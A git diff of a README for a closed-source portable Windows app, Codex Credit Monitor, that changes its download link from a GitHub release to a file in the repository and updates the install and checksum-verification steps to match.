@@ -8,21 +8,21 @@ Codex Credit Monitor turns local Codex session records into a clear dashboard fo
 
 ## Download
 
-Download the current portable package from the [latest release](https://github.com/sibosays/CodexCreditMonitor/releases/latest):
+Download the current portable package directly from this repository:
 
-**[Download Codex Credit Monitor Portable v2.0 (ZIP)](https://github.com/sibosays/CodexCreditMonitor/releases/download/v2.0/CodexCreditMonitorPortable_2.0.zip)**
+**[Download Codex Credit Monitor Portable v2.0 (ZIP)](https://github.com/sibosays/CodexCreditMonitor/raw/refs/heads/main/downloads/CodexCreditMonitorPortable_2.0.zip)**
 
 The repository deliberately contains product information only. The application source code is not published here.
 
 ## Install and start
 
-1. Download `CodexCreditMonitorPortable_2.0.zip` from the release above.
+1. Download `CodexCreditMonitorPortable_2.0.zip` using the link above.
 2. Right-click the ZIP file and choose **Extract All**.
 3. Open the extracted `CodexCreditMonitorPortable` folder.
 4. Run `CodexCreditMonitorPortable.exe`.
 5. Keep the folder intact. The app stores its portable data in its own `Data` folder.
 
-For an integrity check, compare the SHA-256 value in `SHA256SUMS.txt` with the downloaded ZIP file. Because this is an independent Windows app, SmartScreen may initially identify it as an unfamiliar publisher; only proceed after confirming that you downloaded it from this GitHub release and, if needed, verifying the checksum.
+For an integrity check, compare the SHA-256 value in [SHA256SUMS.txt](downloads/SHA256SUMS.txt) with the downloaded ZIP file. Because this is an independent Windows app, SmartScreen may initially identify it as an unfamiliar publisher; only proceed after confirming that you downloaded it from this repository and, if needed, verifying the checksum.
 
 ## What it shows
 
